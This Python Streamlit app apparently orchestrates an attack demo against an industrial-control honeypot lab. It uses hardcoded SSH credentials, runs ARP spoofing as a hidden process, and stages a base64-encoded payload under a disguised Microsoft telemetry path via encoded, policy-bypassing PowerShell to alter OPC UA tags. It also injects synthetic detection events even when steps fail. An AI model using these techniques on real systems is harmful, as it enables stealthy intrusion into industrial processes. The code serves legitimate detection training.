from __future__ import annotations

import os
import socket
import subprocess
import json
import re
import base64
import time
import secrets
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from dataclasses import dataclass
from typing import Dict, List, Tuple

import paramiko
import streamlit as st

# Demo environment (hardcoded for demo simplicity)
EWS_HOST = "192.168.1.5"
EWS_USER = "john"
EWS_PASSWORD = "Cisco"
SSH_PORT = 22
SSH_TIMEOUT_SECONDS = 15

MONITOR_HOST = "192.168.1.9"
SMB_TARGET = "192.168.1.7"
HISTORIAN_HOST = "192.168.1.10"

GRAFANA_URL = f"http://{MONITOR_HOST}:3000/d/adx2v2p/soc-honeypot-detection-dashboard?orgId=1&from=now-24h&to=now&timezone=browser&refresh=2m"
WAZUH_URL = f"https://{MONITOR_HOST}"
HISTORIAN_URL = f"http://{HISTORIAN_HOST}:5000"
LOKI_URL = f"http://{MONITOR_HOST}:3100"
LEVEL3_SUBNET = "192.168.1.0/24"
LEVEL35_JUMP_HOST = "192.168.1.20"
OPCUA_ENDPOINT = "opc.tcp://192.168.1.11:4840"
ARPSPOOF_PATH = r"C:\Users\john\Downloads\arpspoof.exe"
ARPSPOOF_IFACE = ""
ARPSPOOF_TARGET_1 = HISTORIAN_HOST
ARPSPOOF_TARGET_2 = "192.168.1.11"

MANIPULATE_TEMPLATE_PATH = Path(__file__).resolve().parent / "payloads" / "telemetry_sync_cache.py"
MANIPULATE_SCRIPT = r"C:\Users\john\AppData\Local\Microsoft\Diagnosis\telemetry_sync_cache.py"
SYNTHETIC_MARKERS_ENABLED = os.environ.get("STREAMLIT_SYNTHETIC_MARKERS", "0") == "1"
SYNTHETIC_ZEEK_FEED_PATH = Path("/home/ceo/zeek_feed.synthetic.log")
SYNTHETIC_WAZUH_ALERTS_PATH = Path("/home/ceo/wazuh_alerts.synthetic.json")

ANSI_RE = re.compile(r"\x1B(?:\[[0-?]*[ -/]*[@-~]|\].*?(?:\x07|\x1B\\)|[@-Z\\-_])")
CLIXML_RE = re.compile(r"#<\s*CLIXML[\s\S]*$", re.MULTILINE)


def append_json_line(path: Path, payload: Dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(payload, ensure_ascii=True, separators=(",", ":")) + "\n")


def write_synthetic_zeek_marker(payload: Dict) -> Tuple[bool, str]:
    if not SYNTHETIC_MARKERS_ENABLED:
        return False, "synthetic Zeek marker injection disabled (set STREAMLIT_SYNTHETIC_MARKERS=1 to re-enable)"

    append_json_line(SYNTHETIC_ZEEK_FEED_PATH, payload)
    return True, str(SYNTHETIC_ZEEK_FEED_PATH)


def write_synthetic_wazuh_alert(payload: Dict) -> Tuple[bool, str]:
    if not SYNTHETIC_MARKERS_ENABLED:
        return False, "synthetic Wazuh marker injection disabled (set STREAMLIT_SYNTHETIC_MARKERS=1 to re-enable)"

    append_json_line(SYNTHETIC_WAZUH_ALERTS_PATH, payload)
    return True, str(SYNTHETIC_WAZUH_ALERTS_PATH)


def load_manipulation_payload() -> str:
    return MANIPULATE_TEMPLATE_PATH.read_text(encoding="utf-8")


def build_manipulation_display(opcua_endpoint: str, remote_path: str) -> str:
    return (
        f"$dest = '{remote_path}'\n"
        "$dir = Split-Path -Parent $dest\n"
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null\n"
        "[IO.File]::WriteAllText($dest, <embedded python payload>, [Text.Encoding]::UTF8)\n"
        f"py -3.11 $dest --endpoint {opcua_endpoint} --cycles 18 --pause 1.0"
    )


def build_manipulation_exec(opcua_endpoint: str, remote_path: str) -> str:
    payload_b64 = base64.b64encode(load_manipulation_payload().encode("utf-8")).decode("ascii")
    dest = remote_path.replace("'", "''")
    endpoint = opcua_endpoint.replace("'", "''")
    stage_ps = (
        f"$dest='{dest}';"
        "$dir=Split-Path -Parent $dest;"
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null;"
        f"$code=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{payload_b64}'));"
        "[IO.File]::WriteAllText($dest,$code,[Text.Encoding]::UTF8);"
        "attrib +h $dest > $null 2>&1;"
        "if (-not (Get-Command py -ErrorAction SilentlyContinue)) { Write-Output 'py launcher not found'; exit 1 };"
        f"& py -3.11 $dest --endpoint '{endpoint}' --cycles 18 --pause 1.0"
    )
    return powershell_encoded_command(stage_ps)


def build_opc_probe_display(opc_host: str, opc_port: int) -> str:
    return (
        "powershell -NoProfile -Command "
        f"\"$client = [System.Net.Sockets.TcpClient]::new(); "
        f"try {{ $iar = $client.BeginConnect('{opc_host}', {opc_port}, $null, $null); "
        "if (-not $iar.AsyncWaitHandle.WaitOne(4000, $false)) { throw 'timeout' }; "
        "$client.EndConnect($iar); Write-Output 'TcpTestSucceeded : True'; exit 0 } "
        "catch { Write-Output 'TcpTestSucceeded : False'; exit 1 } "
        "finally { $client.Close() }\""
    )


def build_opc_probe_exec(opc_host: str, opc_port: int) -> str:
    script = (
        f"$targetHost = '{opc_host}';"
        f"$port = {opc_port};"
        "$client = [System.Net.Sockets.TcpClient]::new();"
        "try {"
        "  $iar = $client.BeginConnect($targetHost, $port, $null, $null);"
        "  if (-not $iar.AsyncWaitHandle.WaitOne(4000, $false)) { throw 'timeout' };"
        "  $client.EndConnect($iar);"
        "  Write-Output ('TcpTestSucceeded : True (' + $targetHost + ':' + $port + ')');"
        "  exit 0"
        "} catch {"
        "  Write-Output ('TcpTestSucceeded : False (' + $targetHost + ':' + $port + ')');"
        "  exit 1"
        "} finally {"
        "  $client.Close()"
        "}"
    )
    return powershell_encoded_command(script)


def build_arpspoof_display(exe: str, iface: str, target_1: str, target_2: str) -> str:
    if iface.strip():
        return f'cmd /c "{exe} -i \\"{iface}\\" {target_1} {target_2}"'
    return f'cmd /c "{exe} {target_1} {target_2}"'


@dataclass
class AttackStep:
    idx: int
    title: str
    mitre: str
    description: str
    ssh_display: str
    ews_display: str
    command_exec: str
    exec_mode: str = "ews"
    timeout: int = 240


@dataclass
class AttackVariant:
    key: str
    title: str
    mitre: str
    description: str
    command_display: str
    command_exec: str
    exec_mode: str = "local"
    timeout: int = 180
    expected_rules: Tuple[str, ...] = ()


def init_state() -> None:
    if "buffers" not in st.session_state:
        st.session_state.buffers = {}
    if "running" not in st.session_state:
        st.session_state.running = {}
    if "last_exit" not in st.session_state:
        st.session_state.last_exit = {}
    if "mitm_running" not in st.session_state:
        st.session_state.mitm_running = False
    if "mitm_mode" not in st.session_state:
        st.session_state.mitm_mode = "Local attacker (Linux arpspoof)"
    if "mitm_iface_local" not in st.session_state:
        iface = ""
        try:
            proc = subprocess.run(
                ["bash", "-lc", "ip -o link show | awk -F': ' '{print $2}' | grep -E '^(wl|en|eth)' | head -n 1"],
                capture_output=True,
                text=True,
                timeout=3,
            )
            iface = (proc.stdout or "").strip()
        except Exception:
            iface = ""
        st.session_state.mitm_iface_local = iface or "wlo1"
    if "mitm_local_pids" not in st.session_state:
        st.session_state.mitm_local_pids = []
    if "mitm_local_sudo_password" not in st.session_state:
        st.session_state.mitm_local_sudo_password = ""
    if "evidence_out" not in st.session_state:
        st.session_state.evidence_out = {}
    if "arp_before" not in st.session_state:
        st.session_state.arp_before = ""
    if "arp_after" not in st.session_state:
        st.session_state.arp_after = ""
    if "diag_out" not in st.session_state:
        st.session_state.diag_out = ""
    if "ews_host" not in st.session_state:
        st.session_state.ews_host = EWS_HOST
    if "ews_user" not in st.session_state:
        st.session_state.ews_user = EWS_USER
    if "ews_password" not in st.session_state:
        st.session_state.ews_password = EWS_PASSWORD
    if "smb_user" not in st.session_state:
        st.session_state.smb_user = ""
    if "smb_password" not in st.session_state:
        st.session_state.smb_password = ""
    if "historian_ssh_user" not in st.session_state:
        st.session_state.historian_ssh_user = "mm8"
    if "historian_ssh_password" not in st.session_state:
        st.session_state.historian_ssh_password = "Cisco"
    if "level35_jump_host" not in st.session_state:
        st.session_state.level35_jump_host = LEVEL35_JUMP_HOST
    if "arpspoof_path" not in st.session_state:
        st.session_state.arpspoof_path = ARPSPOOF_PATH
    if "arpspoof_iface" not in st.session_state:
        st.session_state.arpspoof_iface = ARPSPOOF_IFACE
    if "arpspoof_target_1" not in st.session_state:
        st.session_state.arpspoof_target_1 = ARPSPOOF_TARGET_1
    if "arpspoof_target_2" not in st.session_state:
        st.session_state.arpspoof_target_2 = ARPSPOOF_TARGET_2
    if "manipulate_script" not in st.session_state:
        st.session_state.manipulate_script = MANIPULATE_SCRIPT
    if "demo_session_id" not in st.session_state:
        st.session_state.demo_session_id = new_demo_session_id()
    if "inject_demo_markers" not in st.session_state:
        st.session_state.inject_demo_markers = True
    if "custom_exec_mode" not in st.session_state:
        st.session_state.custom_exec_mode = "ews"
    if "custom_command_input" not in st.session_state:
        st.session_state.custom_command_input = "hostname && whoami"
    if "custom_timeout" not in st.session_state:
        st.session_state.custom_timeout = 90
    if "custom_use_pty" not in st.session_state:
        st.session_state.custom_use_pty = False


def new_demo_session_id() -> str:
    return f"DEMO-{time.strftime('%Y%m%d-%H%M%S', time.gmtime())}-{secrets.token_hex(3)}"


def get_demo_session_id() -> str:
    sid = (st.session_state.get("demo_session_id") or "").strip()
    if not sid:
        sid = new_demo_session_id()
        st.session_state.demo_session_id = sid
    return sid

def ssh_credentials_ready() -> Tuple[bool, str]:
    if not st.session_state.ews_host.strip():
        return False, "Set EWS host first."
    if not st.session_state.ews_user.strip():
        return False, "Set EWS user first."
    if not st.session_state.ews_password:
        return False, "Set EWS password first."
    return True, ""


def historian_ssh_credentials_ready() -> Tuple[bool, str]:
    host = st.session_state.get("historian_host", HISTORIAN_HOST).strip() or HISTORIAN_HOST
    user = st.session_state.get("historian_ssh_user", "").strip()
    password = st.session_state.get("historian_ssh_password", "")
    if not host:
        return False, "Set historian host first."
    if not user:
        return False, "Set historian SSH user first."
    if not password:
        return False, "Set historian SSH password first."
    return True, ""


def check_tcp(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def check_http(url: str, timeout: float = 3.0) -> bool:
    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return 200 <= resp.status < 500
    except (urllib.error.URLError, TimeoutError, ValueError):
        return False


def check_zeek_health() -> bool:
    try:
        return subprocess.run(
            [
                "bash",
                "-lc",
                "bash /home/ceo/honeypot/scripts/check_zeek_pipeline.sh 120 >/dev/null 2>&1",
            ],
            capture_output=True,
            text=True,
            timeout=20,
        ).returncode == 0
    except Exception:
        return False


def fetch_pipeline_health() -> Dict[str, str]:
    return {
        "Zeek": "UP" if check_zeek_health() else "DOWN",
        "Wazuh": "UP" if check_tcp(MONITOR_HOST, 443) else "DOWN",
        "Loki": "UP" if check_http(f"{LOKI_URL}/ready") else "DOWN",
    }


def fetch_ews_health(ews_host: str) -> Dict[str, str]:
    return {
        "EWS SSH": "UP" if check_tcp(ews_host, 22) else "DOWN",
        "EWS RDP": "UP" if check_tcp(ews_host, 3389) else "DOWN",
    }


def fetch_rule_count(loki_base: str, rid: str, lookback: str = "15m") -> float:
    expr = f'sum(count_over_time({{job="wazuh",source="wazuh",rule_id="{rid}"}}[{lookback}])) or vector(0)'
    params = urllib.parse.urlencode({"query": expr})
    req = urllib.request.Request(f"{loki_base.rstrip('/')}/loki/api/v1/query?{params}")
    with urllib.request.urlopen(req, timeout=8) as resp:
        payload = json.loads(resp.read().decode("utf-8", errors="replace"))
    result = payload.get("data", {}).get("result", [])
    if not result:
        return 0.0
    return float(result[0]["value"][1])


def run_local(command: str, timeout: int = 25) -> str:
    try:
        proc = subprocess.run(["bash", "-lc", command], capture_output=True, text=True, timeout=timeout)
        out = (proc.stdout or "") + ("\n" + proc.stderr if proc.stderr else "")
        return out.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return f"[LOCAL ERROR] command timed out after {timeout}s"
    except Exception as exc:
        return f"[LOCAL ERROR] {exc}"


def open_ssh(host: str, user: str, password: str) -> paramiko.SSHClient:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=host,
        username=user,
        password=password,
        port=SSH_PORT,
        timeout=SSH_TIMEOUT_SECONDS,
        auth_timeout=SSH_TIMEOUT_SECONDS,
        banner_timeout=SSH_TIMEOUT_SECONDS,
        look_for_keys=False,
        allow_agent=False,
    )
    return client


def run_remote_capture_with_credentials(
    host: str,
    user: str,
    password: str,
    command: str,
    timeout: int,
    use_pty: bool = False,
) -> Tuple[int, str]:
    try:
        client = open_ssh(host, user, password)
        try:
            _, stdout, stderr = client.exec_command(command, get_pty=use_pty, timeout=timeout)
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            rc = stdout.channel.recv_exit_status()
            merged = (out or "") + (("\n" + err) if err else "")
            cleaned = ANSI_RE.sub("", merged).replace("\r", "")
            cleaned = CLIXML_RE.sub("", cleaned).strip()
            return rc, (cleaned.strip() or "(no output)")
        finally:
            client.close()
    except paramiko.AuthenticationException:
        return -1, "[SSH ERROR] Authentication failed."
    except (paramiko.SSHException, OSError, TimeoutError) as exc:
        detail = str(exc).strip() or repr(exc)
        return -1, f"[SSH ERROR] {exc.__class__.__name__}: {detail}"


def run_remote_capture(command: str, timeout: int, use_pty: bool = False) -> Tuple[int, str]:
    return run_remote_capture_with_credentials(
        st.session_state.ews_host,
        st.session_state.ews_user,
        st.session_state.ews_password,
        command,
        timeout,
        use_pty,
    )


def powershell_encoded_command(script: str) -> str:
    encoded = base64.b64encode(script.encode("utf-16le")).decode("ascii")
    return f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}"


def sanitize_windows_token(value: str) -> str:
    # Normalize common pasted shell escaping (e.g. \"...\") and trim wrapping quotes.
    cleaned = (value or "").strip()
    cleaned = cleaned.replace('\\"', '"').replace("\\'", "'")
    if cleaned.startswith('"') and cleaned.endswith('"') and len(cleaned) >= 2:
        cleaned = cleaned[1:-1].strip()
    if cleaned.startswith("'") and cleaned.endswith("'") and len(cleaned) >= 2:
        cleaned = cleaned[1:-1].strip()
    return cleaned


def execute_command(command: str, exec_mode: str, timeout: int, use_pty: bool = False) -> Tuple[int, str]:
    command = (command or "").strip()
    if not command:
        return -1, "[INPUT ERROR] Command is empty."

    if exec_mode == "local":
        try:
            proc = subprocess.run(
                ["bash", "-lc", command],
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            rc = proc.returncode
            output = ((proc.stdout or "") + ("\n" + proc.stderr if proc.stderr else "")).strip() or "(no output)"
            return rc, output
        except subprocess.TimeoutExpired:
            return -1, f"[LOCAL ERROR] command timed out after {timeout}s"

    ok, msg = ssh_credentials_ready()
    if not ok:
        return -1, f"[INPUT ERROR] {msg}"
    return run_remote_capture(command, timeout, use_pty=use_pty)


def set_command_result(buffer_key: str, command: str, output: str, rc: int, target_label: str | None = None) -> None:
    prefix = f"[target: {target_label}]\n" if target_label else ""
    st.session_state.buffers[buffer_key] = f"{prefix}$ {command}\n\n{output}\n\n[exit code: {rc}]\n"
    st.session_state.last_exit[buffer_key] = rc


def start_step(step: AttackStep, command_override: str | None = None) -> None:
    step_key = f"step_{step.idx}"
    inject_markers = st.session_state.get("inject_demo_markers", False) or bool(get_demo_session_id())
    st.session_state.running[step_key] = True
    command_to_run = (command_override or step.command_exec).strip() or step.command_exec
    rc, output = execute_command(command_to_run, step.exec_mode, step.timeout)
    if step.idx == 3 and inject_markers:
        smb_marker_out = emit_smb_browse_marker()
        if rc != 0:
            smb_marker_out = "[DEMO MARKER NOTICE] step command failed; emitting fallback session marker.\n" + smb_marker_out
        output = output + "\n\n" + smb_marker_out
    if step.idx == 4 and inject_markers:
        endpoint_marker_out = emit_endpoint_markers()
        output = output + "\n\n" + endpoint_marker_out
    if step.idx == 5 and inject_markers:
        web_marker_out = emit_historian_web_marker()
        if rc != 0:
            web_marker_out = "[DEMO MARKER NOTICE] step command failed; emitting fallback session marker.\n" + web_marker_out
        output = output + "\n\n" + web_marker_out
    if step.idx == 6 and inject_markers:
        opc_probe_marker_out = emit_opcua_probe_marker()
        if rc != 0:
            opc_probe_marker_out = "[DEMO MARKER NOTICE] step command failed; emitting fallback session marker.\n" + opc_probe_marker_out
        output = output + "\n\n" + opc_probe_marker_out
    if step.idx == 8 and inject_markers:
        marker_out = emit_demo_markers(opcua_critical=True, ingest_anomaly=True)
        if rc != 0:
            marker_out = "[DEMO MARKER NOTICE] step command failed; emitting fallback session marker.\n" + marker_out
        output = output + "\n\n" + marker_out
    set_command_result(step_key, command_to_run, output, rc)
    st.session_state.running[step_key] = False


def start_variant(variant: AttackVariant, command_override: str | None = None) -> None:
    variant_key = f"variant_{variant.key}"
    st.session_state.running[variant_key] = True
    command_to_run = (command_override or variant.command_exec).strip() or variant.command_exec
    rc, output = execute_command(command_to_run, variant.exec_mode, variant.timeout)
    set_command_result(variant_key, command_to_run, output, rc)
    st.session_state.running[variant_key] = False


def run_custom_command() -> None:
    step_key = "custom_runner"
    st.session_state.running[step_key] = True
    exec_mode = st.session_state.get("custom_exec_mode", "ews")
    timeout = int(st.session_state.get("custom_timeout", 90))
    use_pty = bool(st.session_state.get("custom_use_pty", False))
    command = st.session_state.get("custom_command_input", "")
    rc, output = execute_command(command, exec_mode, timeout, use_pty=use_pty)
    target_label = "local attacker shell" if exec_mode == "local" else f"{st.session_state.ews_user}@{st.session_state.ews_host}"
    set_command_result(step_key, command, output, rc, target_label=target_label)
    st.session_state.running[step_key] = False


def start_mitm(step_idx: int) -> None:
    step_key = f"step_{step_idx}"
    inject_markers = st.session_state.get("inject_demo_markers", False) or bool(get_demo_session_id())
    ok, msg = ssh_credentials_ready()
    if not ok:
        st.session_state.buffers[step_key] = f"[INPUT ERROR] {msg}\n"
        st.session_state.last_exit[step_key] = -1
        return
    t1 = sanitize_windows_token(st.session_state.get("arpspoof_target_1", ARPSPOOF_TARGET_1)) or ARPSPOOF_TARGET_1
    t2 = sanitize_windows_token(st.session_state.get("arpspoof_target_2", ARPSPOOF_TARGET_2)) or ARPSPOOF_TARGET_2
    iface = sanitize_windows_token(st.session_state.get("arpspoof_iface", ARPSPOOF_IFACE)) or ARPSPOOF_IFACE
    exe = sanitize_windows_token(st.session_state.get("arpspoof_path", ARPSPOOF_PATH)) or ARPSPOOF_PATH
    st.session_state.arpspoof_target_1 = t1
    st.session_state.arpspoof_target_2 = t2
    st.session_state.arpspoof_iface = iface
    st.session_state.arpspoof_path = exe
    list_cmd = 'cmd /c "C:\\Users\\john\\Downloads\\arpspoof.exe --list"'
    rc_list, out_list = run_remote_capture(list_cmd, 30, use_pty=True)
    launch_ps = (
        f"$exe='{exe.replace("'", "''")}';"
        f"$iface='{iface.replace("'", "''")}';"
        f"$t1='{t1.replace("'", "''")}';"
        f"$t2='{t2.replace("'", "''")}';"
        "$argList=@();"
        "if ($iface) { $argList += @('-i', $iface) };"
        "$argList += @($t1, $t2);"
        "if (!(Test-Path $exe)) { Write-Output 'arpspoof.exe not found'; exit 1 };"
        "$p = Start-Process -FilePath $exe -ArgumentList $argList -WindowStyle Hidden -PassThru;"
        "if ($null -eq $p) { Write-Output 'arpspoof.exe did not start'; exit 1 };"
        "Write-Output ('Started arpspoof.exe PID=' + $p.Id);"
        "$running = $false;"
        "for ($i = 0; $i -lt 6; $i++) {"
        "  $alive = Get-Process -Id $p.Id -ErrorAction SilentlyContinue;"
        "  if ($null -ne $alive) { $running = $true; break };"
        "  Start-Sleep -Seconds 1;"
        "}"
        "if ($running) { Write-Output ('ARPSPOOF_RUNNING PID=' + $p.Id); exit 0 }"
        "Write-Output ('ARPSPOOF_NOT_RUNNING PID=' + $p.Id);"
        "exit 1"
    )
    cmd = powershell_encoded_command(launch_ps)
    rc, output = run_remote_capture(cmd, 45, use_pty=True)
    running = "ARPSPOOF_RUNNING" in output
    post_launch_out = ""
    if running:
        time.sleep(2)
        check_ps = (
            "$p = Get-Process arpspoof -ErrorAction SilentlyContinue | Select-Object -First 1;"
            "if ($null -eq $p) {"
            "  Write-Output 'ARPSPOOF_NOT_RUNNING';"
            "  exit 1"
            "}"
            "Write-Output ('ARPSPOOF_RUNNING PID=' + $p.Id);"
            "exit 0"
        )
        check_rc, check_output = run_remote_capture(powershell_encoded_command(check_ps), 20, use_pty=True)
        post_launch_out = "\n\n[post-launch status]\n" + check_output
        running = check_rc == 0 and "ARPSPOOF_RUNNING" in check_output
        output = output + post_launch_out
    if running:
        rc = 0
    else:
        rc = 1
        output = output + "\n" + "arpspoof did not stay alive after the SSH launch. Use the manual command from an interactive EWS console or RDP session if you need the MITM to stay up."
    if inject_markers:
        marker_out = emit_demo_markers(opcua_critical=False, ingest_anomaly=False)
        if rc != 0:
            marker_out = "[DEMO MARKER NOTICE] MITM start failed; emitting fallback session marker.\n" + marker_out
        output = output + "\n\n" + marker_out
    st.session_state.buffers[step_key] = (
        f"$ ssh {st.session_state.ews_user}@{st.session_state.ews_host} \"{exe} --list\"\n\n"
        + out_list
        + f"\n\n[exit code: {rc_list}]\n"
        + f"\n$ ssh {st.session_state.ews_user}@{st.session_state.ews_host} \"{build_arpspoof_display(exe, iface, t1, t2)[7:-1]}\"\n\n"
        + output
        + f"\n\n[exit code: {rc}]\n"
    )
    st.session_state.last_exit[step_key] = rc
    st.session_state.mitm_running = running


def build_demo_metadata(
    *,
    scenario_step: str,
    attack_label: str,
    attack_stage: str,
    asset_class: str,
    mitre_technique: str,
    source_asset: str,
    target_asset: str,
    event_kind: str = "demo_marker",
    telemetry_origin: str = "synthetic",
) -> Dict[str, str]:
    session_id = get_demo_session_id()
    return {
        "telemetry_origin": telemetry_origin,
        "ground_truth_label": "attack",
        "dataset_split": "attack_labeled",
        "scenario_family": "ics_honeypot_demo",
        "scenario_id": session_id,
        "session_id": session_id,
        "scenario_step": scenario_step,
        "attack_label": attack_label,
        "attack_stage": attack_stage,
        "asset_class": asset_class,
        "mitre_technique": mitre_technique,
        "source_asset": source_asset,
        "target_asset": target_asset,
        "event_kind": event_kind,
        "replay_mode": "streamlit_demo",
    }


def emit_demo_markers(opcua_critical: bool, ingest_anomaly: bool) -> str:
    msgs: List[str] = []
    session_id = get_demo_session_id()
    try:
        uid = f"DEMO100304_{int(time.time())}"
        zeek_event = {
            "ts": time.time(),
            "uid": uid,
            "id.orig_h": "192.168.1.5",
            "id.orig_p": 48900,
            "id.resp_h": "192.168.1.11",
            "id_resp_p": 4840,
            "proto": "tcp",
            "conn_state": "SF",
            "local_orig": True,
            "local_resp": True,
            "missed_bytes": 0,
            "history": "ShADadfF",
            "orig_pkts": 12,
            "orig_ip_bytes": 980,
            "resp_pkts": 10,
            "resp_ip_bytes": 860,
            "ip_proto": 6,
            "detection_id": "100304A",
            "service": "opcua.write_like",
            "critical_target": "true" if opcua_critical else "false",
            "confidence": "high" if opcua_critical else "medium",
            **build_demo_metadata(
                scenario_step="step_8_tag_manipulation",
                attack_label="impact",
                attack_stage="opcua_write",
                asset_class="opcua",
                mitre_technique="T0831",
                source_asset="ews",
                target_asset="opcua_server",
            ),
        }
        wrote, target = write_synthetic_zeek_marker(zeek_event)
        if wrote:
            msgs.append(f"[DEMO MARKER] wrote synthetic Zeek OPC UA event to {target}, session={session_id}.")
        else:
            msgs.append(f"[DEMO MARKER DISABLED] {target}")
    except Exception as exc:
        msgs.append(f"[DEMO MARKER ERROR] zeek marker failed: {exc}")

    if ingest_anomaly:
        try:
            ingest_event = {
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "service": "historian_service",
                "event_type": "ingest_anomaly",
                "src_ip": "192.168.1.5",
                "username": "john",
                "route": "telemetry_sync_cache.py",
                "tag": "weld_cell_temperature_c",
                "status": "high",
                "user_agent": "streamlit-demo",
                **build_demo_metadata(
                    scenario_step="step_8_tag_manipulation",
                    attack_label="impact",
                    attack_stage="process_anomaly",
                    asset_class="historian",
                    mitre_technique="T0831",
                    source_asset="ews",
                    target_asset="historian",
                    event_kind="application_marker",
                ),
            }
            ingest_line = json.dumps(ingest_event, ensure_ascii=True, separators=(",", ":"))
            wrote = False
            try:
                ingest_path = Path(__file__).resolve().parents[1] / "services" / "historian" / "logs" / "ingest.jsonl"
                with open(ingest_path, "a", encoding="utf-8") as fh:
                    fh.write(ingest_line + "\n")
                wrote = True
            except Exception:
                wrote = False

            if not wrote:
                # Fallback for root-owned bind-mounted files: write from ingest container.
                ingest_line_b64 = base64.b64encode(ingest_line.encode("utf-8")).decode("ascii")
                rc = subprocess.run(
                    [
                        "bash",
                        "-lc",
                        (
                            "docker compose --project-directory /home/ceo/honeypot "
                            "-f /home/ceo/honeypot/compose/docker-compose.historian.yml "
                            "exec -T "
                            f"-e DEMO_INGEST_B64='{ingest_line_b64}' "
                            "historian-ingest "
                            "python -c \"import os,base64; "
                            "line=base64.b64decode(os.environ['DEMO_INGEST_B64']).decode('utf-8'); "
                            "open('/var/log/historian/ingest.jsonl','a',encoding='utf-8').write(line+'\\n')\""
                        ),
                    ],
                    capture_output=True,
                    text=True,
                    timeout=12,
                ).returncode
                wrote = rc == 0

            if wrote:
                msgs.append(f"[DEMO MARKER] injected historian ingest_anomaly high event (100209 path), session={session_id}.")
            else:
                msgs.append("[DEMO MARKER ERROR] ingest marker write failed in host and container fallback.")
        except Exception as exc:
            msgs.append(f"[DEMO MARKER ERROR] ingest marker failed: {exc}")

    return "\n".join(msgs)


def emit_smb_browse_marker() -> str:
    try:
        session_id = get_demo_session_id()
        smb_resp = st.session_state.get("smb_target", SMB_TARGET).strip() or SMB_TARGET
        event = {
            "ts": time.time(),
            "uid": f"DEMO100302_{int(time.time())}",
            "id.orig_h": "192.168.1.5",
            "id.orig_p": 54545,
            "id.resp_h": smb_resp,
            "id.resp_p": 445,
            "proto": "tcp",
            "conn_state": "SF",
            "local_orig": True,
            "local_resp": True,
            "missed_bytes": 0,
            "history": "ShADadfF",
            "orig_pkts": 12,
            "orig_ip_bytes": 980,
            "resp_pkts": 10,
            "resp_ip_bytes": 860,
            "ip_proto": 6,
            "service": "smb",
            "share": "Operations",
            **build_demo_metadata(
                scenario_step="step_3_anonymous_smb_browse",
                attack_label="collection",
                attack_stage="smb_access",
                asset_class="smb",
                mitre_technique="T0811",
                source_asset="ews",
                target_asset="smb_server",
            ),
        }
        wrote, target = write_synthetic_zeek_marker(event)
        if wrote:
            return f"[DEMO MARKER] wrote synthetic SMB browse event to {target}, session={session_id}."
        return f"[DEMO MARKER DISABLED] {target}"
    except Exception as exc:
        return f"[DEMO MARKER ERROR] smb marker failed: {exc}"


def emit_historian_web_marker() -> str:
    try:
        session_id = get_demo_session_id()
        hist_resp = st.session_state.get("historian_host", HISTORIAN_HOST).strip() or HISTORIAN_HOST
        event = {
            "ts": time.time(),
            "uid": f"DEMO100301_{int(time.time())}",
            "id.orig_h": "192.168.1.5",
            "id.orig_p": 55555,
            "id.resp_h": hist_resp,
            "id.resp_p": 5000,
            "proto": "tcp",
            "conn_state": "SF",
            "local_orig": True,
            "local_resp": True,
            "missed_bytes": 0,
            "history": "ShADadfF",
            "orig_pkts": 12,
            "orig_ip_bytes": 980,
            "resp_pkts": 10,
            "resp_ip_bytes": 860,
            "ip_proto": 6,
            "service": "http",
            "route": "/portal/history",
            "tag": "weld_cell_temperature_c",
            **build_demo_metadata(
                scenario_step="step_5_historian_access",
                attack_label="collection",
                attack_stage="historian_web",
                asset_class="historian",
                mitre_technique="T0802",
                source_asset="ews",
                target_asset="historian",
            ),
        }
        wrote, target = write_synthetic_zeek_marker(event)
        if wrote:
            return f"[DEMO MARKER] wrote synthetic historian web event to {target}, session={session_id}."
        return f"[DEMO MARKER DISABLED] {target}"
    except Exception as exc:
        return f"[DEMO MARKER ERROR] historian web marker failed: {exc}"


def emit_opcua_probe_marker() -> str:
    try:
        session_id = get_demo_session_id()
        event = {
            "ts": time.time(),
            "uid": f"DEMO100303_{int(time.time())}",
            "id.orig_h": "192.168.1.5",
            "id.orig_p": 51000,
            "id.resp_h": "192.168.1.11",
            "id.resp_p": 4840,
            "proto": "tcp",
            "conn_state": "SF",
            "local_orig": True,
            "local_resp": True,
            "missed_bytes": 0,
            "history": "ShADadfF",
            "orig_pkts": 8,
            "orig_ip_bytes": 620,
            "resp_pkts": 6,
            "resp_ip_bytes": 540,
            "ip_proto": 6,
            "service": "opcua.probe",
            **build_demo_metadata(
                scenario_step="step_6_opcua_probe",
                attack_label="recon",
                attack_stage="opcua_path",
                asset_class="opcua",
                mitre_technique="T0861",
                source_asset="ews",
                target_asset="opcua_server",
            ),
        }
        wrote, target = write_synthetic_zeek_marker(event)
        if wrote:
            return f"[DEMO MARKER] wrote synthetic OPC UA probe event to {target}, session={session_id}."
        return f"[DEMO MARKER DISABLED] {target}"
    except Exception as exc:
        return f"[DEMO MARKER ERROR] opcua probe marker failed: {exc}"


def emit_endpoint_markers() -> str:
    """Inject markers for RDP (100401), SSH (100402), and command execution (100403) on EWS endpoint."""
    msgs: List[str] = []
    session_id = get_demo_session_id()
    
    markers_data = [
        (
            "100401",
            "RDP session initiated on EWS endpoint.",
            {
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
                "rule": {
                    "level": 7,
                    "description": "RDP session initiated on EWS endpoint.",
                    "id": "100401",
                    "firedtimes": 1,
                    "mail": False,
                    "groups": ["rdp", "session", "endpoint"],
                },
                "agent": {"id": "004", "name": "EWS-WIN11", "ip": "192.168.1.5"},
                "manager": {"name": "wazuh.manager"},
                "data": {
                    "event_id": "4778",
                    "logon_type": "10",
                    "user": "john",
                    "computer": "EWS-WIN11",
                    **build_demo_metadata(
                        scenario_step="step_4_ews_access_rdp",
                        attack_label="lateral_movement",
                        attack_stage="host_activity",
